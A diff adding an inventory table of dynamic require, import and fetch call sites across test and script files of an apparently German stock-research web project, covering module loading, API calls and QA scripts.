+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/engines/intelligence-brief.js")) ` |
+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/engines/change-engine.js")) ` |
+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/intelligence-brief.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/internal-links.test.mjs | ` import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) ` |
+| quant/tests/intraday-delivery-contract.test.mjs | ` require(join(root, "quant", "engines", "realtime", "intraday-snapshot.js")) ` |
+| quant/tests/intraday-delivery-contract.test.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| quant/tests/intraday-scope.test.mjs | ` require(join(root, "quant", "engines", "realtime", "intraday-scope.js")) ` |
+| quant/tests/journey-shape.test.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| quant/tests/journey-shape.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/journey-shape.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/journey-shape.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/last-price-from-series.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/last-price-from-series.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/last-price-from-series.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/launch-gates.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/launch-gates.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/launch-gates.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/launch-gates.test.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| quant/tests/launch-gates.test.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| quant/tests/listing-continuity.test.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| quant/tests/live-candle.test.mjs | ` require(join(engines, "realtime", "transport.js")) ` |
+| quant/tests/live-candle.test.mjs | ` require(join(engines, "realtime", "bar-merge.js")) ` |
+| quant/tests/live-candle.test.mjs | ` require(join(root, "providers", "tiingo", "realtime.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "instrument-classification.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "market-factors.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "market-quality.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "realtime", "subscription-tiers.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "technical", "feature-store.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "technical", "momentum-engine.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "chart-ranges.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "market-client.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "market-client.js")) ` |
+| quant/tests/market-scale.test.mjs | ` require(join(engines, "market-client.js")) ` |
+| quant/tests/naming-contract.test.mjs | ` require(), die Seite in einem DOM-Doppel mit den echten Dateien. ` |
+| quant/tests/naming-contract.test.mjs | ` require(join(ROOT, "quant/engines/company-naming-contract.js")) ` |
+| quant/tests/naming-contract.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/naming-contract.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/naming-contract.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/naming-contract.test.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| quant/tests/no-mock-in-product.test.mjs | ` import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) ` |
+| quant/tests/ownership-signals.test.mjs | ` require(join(root, "quant/engines/ownership-signals.js")) ` |
+| quant/tests/pacemaker.test.mjs | ` require(join(root, "quant", "engines", "realtime", "pacemaker.js")) ` |
+| quant/tests/pattern-unavailability.test.mjs | ` require() geprueft. Die ` |
+| quant/tests/pattern-unavailability.test.mjs | ` require(join(root, "quant/api/product-services.js")) ` |
+| quant/tests/pattern-unavailability.test.mjs | ` require(join(root, "quant/engines/display-policy.js")) ` |
+| quant/tests/pattern-unavailability.test.mjs | ` require(join(root, "quant/engines/query.js")) ` |
+| quant/tests/pattern-unavailability.test.mjs | ` require(join(root, "quant/app/view-model.js")) ` |
+| quant/tests/persist-fundamentals.test.mjs | ` import(join(root, "scripts", "quant", "sec", "persist-fundamentals.mjs")) ` |
+| quant/tests/persist-fundamentals.test.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| quant/tests/pipeline-freshness-contract.test.mjs | ` import(join(ROOT, "scripts/quant/measure-pipeline-freshness.mjs")) ` |
+| quant/tests/plain-verdict.test.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| quant/tests/plain-verdict.test.mjs | ` require(join(ROOT, "quant/engines/plain-verdict.js")) ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/quant/engines/portfolio-risk.cjs') ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/quant/engines/portfolio-construction.cjs') ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/quant/engines/portfolio-pit-factors.cjs') ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/quant/engines/portfolio-backtest.cjs') ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/scripts/quant/portfolio/model-portfolios.cjs') ` |
+| quant/tests/portfolio-standard.test.mjs | ` require(ROOT + '/scripts/quant/portfolio/export-public-model-portfolios.cjs') ` |
+| quant/tests/published-close.test.mjs | ` require(join(ROOT, "quant/engines/published-close.js")) ` |
+| quant/tests/rejection-lifecycle.test.mjs | ` require(join(root, "quant", "engines", "rejection-lifecycle.js")) ` |
+| quant/tests/research-v8-classification.test.mjs | ` require(${JSON.stringify(join(f.source,'scripts/quant/materialize-real-backtest-read.cjs'))}) ` |
+| quant/tests/screener-hit-row.test.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| quant/tests/screener-hit-row.test.mjs | ` require(join(ROOT, "quant/engines/plain-verdict.js")) ` |
+| quant/tests/screener-hit-row.test.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/api/screener-workspace.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| quant/tests/screener-surface.test.mjs | ` require(join(ROOT, "quant/engines/quant-methodology-contract.js")) ` |
+| quant/tests/sec-panel-published-close.test.mjs | ` require(join(ROOT, "quant/engines/published-close.js")) ` |
+| quant/tests/security-master-duplicate-resolution.test.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| quant/tests/security-master-duplicate-resolution.test.mjs | ` require(join(root, "core", "identity.js")) ` |
+| quant/tests/security-master-duplicate-resolution.test.mjs | ` import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) ` |
+| quant/tests/security-master-rename-continuation.test.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| quant/tests/security-master-rename-continuation.test.mjs | ` require(join(root, "core", "identity.js")) ` |
+| quant/tests/security-master-rename-continuation.test.mjs | ` import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) ` |
+| quant/tests/security-master-rename-continuation.test.mjs | ` import(join(root, "scripts", "market", "build-company-names.mjs")) ` |
+| quant/tests/security-master-rename-continuation.test.mjs | ` import(join(root, "scripts", "market", "build-security-master-approval-list.mjs")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/intelligence-brief.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/security-type-safety.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/source-state.test.mjs | ` require(join(root, "quant", "engines", "realtime", "source-state.js")) ` |
+| quant/tests/stock-page-payload.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/stock-page-payload.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/stock-page-payload.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/stock-page-payload.test.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| quant/tests/stock-page-payload.test.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| quant/tests/stock-page-shards.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/stock-page-shards.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/stock-page-shards.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/stock-page-shards.test.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| quant/tests/stock-page-shards.test.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| quant/tests/technical-ap8-l1.test.mjs | ` require(join(root, "quant/engines/technical/screen-row.js")) ` |
+| quant/tests/technical-ap8-l1.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| quant/tests/technical-ap8-l1.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| quant/tests/technical-ap8-l1.test.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| quant/tests/technical-ap8-l2.test.mjs | ` require(join(root, "quant/engines/technical/screen-row.js")) ` |
+| quant/tests/technical-ap8-l2.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| quant/tests/technical-ap8-l2.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| quant/tests/technical-ap8-l2.test.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| quant/tests/technical-ap8-l3.test.mjs | ` require(join(root, "quant/engines/technical/screen-row.js")) ` |
+| quant/tests/technical-ap8-l3.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| quant/tests/technical-ap8-l3.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| quant/tests/technical-ap8-l4.test.mjs | ` require(join(root, "quant/engines/technical/screen-row.js")) ` |
+| quant/tests/technical-ap8-l4.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| quant/tests/technical-ap8-l4.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| quant/tests/technical-ap8-l5.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| quant/tests/technical-ap8-l5.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| quant/tests/technical-unavailability.test.mjs | ` require() geprueft. ` |
+| quant/tests/ti-data-freshness.test.mjs | ` require(join(ROOT, "ask/engine.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` require(join(ROOT, "quant/engines/technical/ti/context.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` require(join(ROOT, "quant/engines/technical/ti/alerts.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) ` |
+| quant/tests/ti-mission4.test.mjs | ` import(join(ROOT, "quant/tests/elliott-corpus.mjs")) ` |
+| quant/tests/ti-mission4.test.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| quant/tests/ti-mission4.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) ` |
+| quant/tests/ti-mission4.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) ` |
+| quant/tests/universe-list.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/universe-list.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/universe-list.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/universe-list.test.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| quant/tests/universe-list.test.mjs | ` fetch(", "https://", "axios", "tiingoRequest", "apiKey", "process.env.TIINGO"]) { ` |
+| quant/tests/us-security-master-artefacts.test.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| quant/tests/us-security-master.test.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| quant/tests/us-security-master.test.mjs | ` require(join(root, "quant", "engines", "instrument-classification.js")) ` |
+| quant/tests/v10-corporate-actions.test.mjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| quant/tests/v10-corporate-actions.test.mjs | ` require(path.join(root, 'quant/engines/research-ca-evidence.cjs')) ` |
+| quant/tests/v10-corporate-actions.test.mjs | ` require(path.join(root, 'quant/engines/corporate-action-evidence.js')) ` |
+| quant/tests/v10-corporate-actions.test.mjs | ` require(outs[0]) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'scripts/quant/v10/factor/factors.cjs')) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'scripts/quant/v10/factor/study.cjs')) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'scripts/quant/v10/factor/panel.cjs')) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'scripts/quant/v10/factor/common.cjs')) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| quant/tests/v10-factor.test.mjs | ` require(join(ROOT, 'quant/engines/fundamental-inputs.js')) ` |
+| quant/tests/v10-setup.test.mjs | ` require(join(ROOT, "scripts/quant/v10/setup/setup-lib.cjs")) ` |
+| quant/tests/v10-setup.test.mjs | ` require(join(ROOT, "scripts/quant/v10/setup/setup-original-inventory.cjs")) ` |
+| quant/tests/v10-setup.test.mjs | ` require(join(ROOT, "scripts/quant/v10/setup/build-setup-independence-decision.cjs")) ` |
+| quant/tests/v10-setup.test.mjs | ` require(join(ROOT, "quant/engines/research-validation.cjs")) ` |
+| quant/tests/v10-setup.test.mjs | ` import(join(ROOT, "scripts/quant/build-setup-outcomes.mjs")) ` |
+| quant/tests/v12-indexpop.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/indexpop/lib.cjs')) ` |
+| quant/tests/v12-largecap.test.mjs | ` require(ie) ` |
+| quant/tests/v12-listref.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/listref/reflib.cjs')) ` |
+| quant/tests/v12-listref.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/listref/build_reference.cjs')) ` |
+| quant/tests/v12-listref.test.mjs | ` require(path.join(ROOT, 'quant/engines/research-listing-reference.cjs')) ` |
+| quant/tests/v12-requal.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/requal/lib.cjs')) ` |
+| quant/tests/v12-requal.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/requal/p6-strategies.cjs')) ` |
+| quant/tests/v12-requal.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/requal/p5c-factor.cjs')) ` |
+| quant/tests/v12-requal.test.mjs | ` require(path.join(ROOT, 'scripts/quant/v12/requal/plan.cjs')) ` |
+| quant/tests/v12-spxpop.test.mjs | ` require(path.join(ROOT, 'quant/engines/research-index-population.cjs')) ` |
+| quant/tests/v13-studies.test.mjs | ` require(ROOT + '/scripts/quant/v13/studies/lib.cjs') ` |
+| quant/tests/v13-studies.test.mjs | ` require(ROOT + '/scripts/quant/v13/studies/run-s3.cjs') ` |
+| quant/tests/v13-studies.test.mjs | ` require(ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| quant/tests/v13b-f1w.test.mjs | ` require(ROOT + '/scripts/quant/v13b/f1w/lib.cjs') ` |
+| quant/tests/v13b-f1w.test.mjs | ` require(ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| quant/tests/v13c-study.test.mjs | ` require(ROOT + '/scripts/quant/v13c/lib.cjs') ` |
+| quant/tests/v13c-study.test.mjs | ` require(ROOT + '/scripts/quant/v13c/run-s3.cjs') ` |
+| quant/tests/valuation-consistency.test.mjs | ` require() geprueft), der Kennzahlenkasten ist der Abschnitt ` |
+| quant/tests/valuation-consistency.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/valuation-consistency.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/valuation-consistency.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/valuation-consistency.test.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| quant/tests/valuation-consistency.test.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| quant/tests/zero-cost-guard.test.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| quant/tests/zero-cost-guard.test.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| quant/ui/release-guard.js | ` fetch(ID_URL + '?t=' + now(), { cache: 'no-store', credentials: 'omit' }) ` |
+| quant/ui/shell.js | ` fetch(path, { cache: "no-cache" }) ` |
+| quant/ui/shell.js | ` fetch(path, { cache: "no-cache" }).then(function (res) { ` |
+| screener/engine/adapters.js | ` fetch(url, Object.assign({ cache: 'default' }, opts &#124;&#124; {})).then(function (r) { ` |
+| scripts/access-gate/browser-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') ` |
+| scripts/access-gate/runtime.js | ` fetch(loader.getAttribute('data-content')) ` |
+| scripts/account/browser-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') ` |
+| scripts/account/check-auto-env.mjs | `` fetch(`https://api.github.com/repos/${REPO}/environments/account-auto${p}`, `` |
+| scripts/account/journey-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') ` |
+| scripts/account/journey-qa.mjs | ` fetch(base + '/v1/plans')).json()).newsletter) ` |
+| scripts/account/journey-qa.mjs | ` fetch(b + '/v1/me', {credentials: 'include', headers: {'X-VU-Client': 'web'}})).json(), base) ` |
+| scripts/account/journey-qa.mjs | ` fetch(b + '/v1/session', {credentials: 'include', headers: {'X-VU-Client': 'web'}})).json(), base) ` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/tester?email=${encodeURIComponent(email)}`, {method: 'POST'}) `` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/tester?email=${encodeURIComponent(email)}`, {method: 'POST'}) `` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/sepa/latest/paid`, {method: 'POST'}) `` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/cron`, {method: 'POST'}) `` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/brevo/confirm?email=${encodeURIComponent(email)}`, {method: 'POST'}) `` |
+| scripts/account/journey-qa.mjs | `` fetch(`${base}/__dev/cron`, {method: 'POST'}) `` |
+| scripts/account/quant-watch-coupling-qa.mjs | ` fetch('/quant/data/universe/instruments/' + globalThis.VUCore.Identity.shardKey('MSFT') + '.json')).json()).instruments.find(i => i.symbol === 'MSFT' && i.active).ins ` |
+| scripts/account/release-guard.mjs | ` fetch(api + p, {signal: AbortSignal.timeout(20000)}) ` |
+| scripts/account/watchlist-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') ` |
+| scripts/analysts/fetch-consensus.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/analysts/fetch-consensus.mjs | ` fetch(url, { headers, signal: AbortSignal.timeout(30000) }) ` |
+| scripts/analysts/probe-consensus.mjs | ` fetch(url, { headers, signal: AbortSignal.timeout(30000) }) ` |
+| scripts/ci/pipeline-alarm.mjs | ` fetch(base + pfad, { ` |
+| scripts/ci/push-with-retry.sh | ` fetch                  (Standard 3) ` |
+| scripts/ci/supertrader-chain.mjs | ` fetch(base + "/repos/" + repo + path, Object.assign({}, init, { headers, signal: AbortSignal.timeout(20000) })) ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(), body=await response.json() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json(),past=new Date(Date.now()-3600000).toISOString() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/browser-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/discover-beta-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/discover-beta-qa.mjs | ` fetch(),body=await response.json() ` |
+| scripts/company_intelligence/numeric-band-review.mjs | ` fetch(url,init),limits:{requestsPerMinute:3,requestsPerHour:3,requestsPerDay:3,maxRetries:0,concurrency:1}}) ` |
+| scripts/company_intelligence/numeric-band-review.mjs | ` fetch(sourceUrl,{headers:{'User-Agent':'VisionUniverseResearch info@visionuniverse.de'},signal:AbortSignal.timeout(30000)}) ` |
+| scripts/company_intelligence/propagation-proof.mjs | ` fetch(url, {cache: 'no-store', headers: {'cache-control': 'no-cache', pragma: 'no-cache'}, signal: AbortSignal.timeout(timeout)}) ` |
+| scripts/company_intelligence/refresh-qa.mjs | ` fetch(origin+'/release-delivery.json?refresh='+Date.now())).json() ` |
+| scripts/company_intelligence/refresh-qa.mjs | ` fetch(origin+'/company-intelligence/data/'+path+'?refresh='+Date.now())).arrayBuffer()):readFileSync(join(directory,path)) ` |
+| scripts/company_intelligence/refresh-qa.mjs | ` fetch() ` |
+| scripts/company_intelligence/runtime-candidate.mjs | ` fetch(origin+p+'?refresh-proof='+Date.now(),{signal:AbortSignal.timeout(30000)}) ` |
+| scripts/company_intelligence/scheduler-gate.mjs | ` fetch(base+path,{signal:AbortSignal.timeout(15000),headers:{accept:'application/vnd.github+json','x-github-api-version':'2022-11-28',...(token?{authorization:'Bearer  ` |
+| scripts/company_intelligence/tests/legacy-restore.test.mjs | ` import(pathToFileURL(file).href+'?m='+Math.random()) ` |
+| scripts/company_intelligence/tests/refreeze-auto.test.mjs | ` import(pathToFileURL(file).href) ` |
+| scripts/company_intelligence/tests/refresh-dispatch-wait.test.mjs | ` import('data:text/javascript ` |
+| scripts/company_intelligence/tests/refresh-watchdog.test.mjs | ` import(pathToFileURL(modulePath).href) ` |
+| scripts/company_intelligence/tests/refresh-watchdog.test.mjs | ` import(pathToFileURL(join(repoRoot,'scripts/company_intelligence/scheduler-gate.mjs')).href) ` |
+| scripts/company_intelligence/tests/rollback-cas.test.mjs | ` import('data:text/javascript ` |
+| scripts/company_intelligence/tests/rollback-cas.test.mjs | ` import('data:text/javascript ` |
+| scripts/company_intelligence/tests/scheduler-gate.test.mjs | ` import(gateUrl) ` |
+| scripts/company_intelligence/tests/test_wordpress_news.py | ` fetch(h,s) ` |
+| scripts/company_intelligence/universe-browser-qa.mjs | ` fetch(origin+'/company-intelligence-refresh.json?qa='+Date.now())).json():null ` |
+| scripts/company_intelligence/universe-browser-qa.mjs | ` fetch(origin+'/release-delivery.json?qa='+Date.now())).json() ` |
+| scripts/company_intelligence/universe-release.mjs | ` fetch('https://research.visionuniverse.de/company-intelligence-delivery.json?freeze='+Date.now())).json() ` |
+| scripts/company_intelligence/universe-release.mjs | ` fetch('https://research.visionuniverse.de/release-delivery.json?freeze='+Date.now())).json() ` |
+| scripts/company_intelligence/verify-pilot-delivery.mjs | ` fetch(base+encodeURIComponent(path)) ` |
+| scripts/company_intelligence/wordpress_news.py | ` fetch(http, source): ` |
+| scripts/company_intelligence/wordpress_news.py | ` fetch(http, source) ` |
+| scripts/company_intelligence/wordpress_news.py | ` fetch(http, source) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "core", "data-quality.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "core", "identity.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "realtime", "trading-session.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "core", "listing-staleness.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "technical", "technical-query.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "technical", "multi-timeframe.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "technical", "screen-row.js")) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "technical", "screener-contract.js")) ` |
+| scripts/core/data-quality.mjs | ` require(tplPath), ds = TQ.createDataset(twArt) ` |
+| scripts/core/data-quality.mjs | ` require(join(REPO_ROOT, "quant", "engines", "published-close.js")) ` |
+| scripts/core/diagnose.mjs | ` require(join(REPO_ROOT, "core", "diagnose.js")) ` |
+| scripts/core/diagnose.mjs | ` require(join(REPO_ROOT, "core", "listing-staleness.js")) ` |
+| scripts/core/diagnose.mjs | ` require(join(REPO_ROOT, "core", "client.js")) ` |
+| scripts/core/lib.mjs | ` fetch(url, { headers: { "cache-control": "no-cache" } }) ` |
+| scripts/core/lib.mjs | ` require(join(root, "core", "health.js")), ` |
+| scripts/core/lib.mjs | ` require(join(root, "core", "identity.js")), ` |
+| scripts/core/lib.mjs | ` require(join(root, "quant", "engines", "realtime", "trading-session.js")), ` |
+| scripts/core/r2-audit.mjs | ` fetch("https://api.cloudflare.com/client/v4" + path, { ` |
+| scripts/dashboard/update_news.mjs | ` fetch(url, options) ` |
+| scripts/diagnose/adjustment-steps.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/diagnose/adjustment-steps.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/diagnose/adjustment-steps.mjs | ` require(join(root, "quant", "engines", "market-quality.js")) ` |
+| scripts/diagnose/adjustment-steps.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/diagnose/adjustment-steps.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/diagnose/coverage-delta.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/diagnose/coverage-delta.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/diagnose/coverage-delta.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs"))).createFsDriver(localRoot) ` |
+| scripts/diagnose/coverage-delta.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs"))).createS3DriverFromEnv() ` |
+| scripts/discover/assert-source-state-coverage.mjs | ` require(join(engines, "realtime", "source-state.js")) ` |
+| scripts/discover/assert-source-state-coverage.mjs | ` require(join(engines, "realtime", "market-hours.js")) ` |
+| scripts/discover/assert-source-state-coverage.mjs | ` require(join(engines, "realtime", "trading-session.js")) ` |
+| scripts/discover/assert-source-state-coverage.mjs | ` require(join(root, "quant", "config", "market-calendar.json")) ` |
+| scripts/discover/assert-source-state-coverage.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/discover/browser-qa-direct.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES + '/playwright') ` |
+| scripts/discover/browser-qa-direct.mjs | ` fetch(base + '/release-id.json') ` |
+| scripts/discover/browser-qa-maerkte.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') ` |
+| scripts/discover/browser-qa-realtime.mjs | ` require(join(root, "quant", "engines", "realtime", "market-hours.js")) ` |
+| scripts/discover/browser-qa.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') ` |
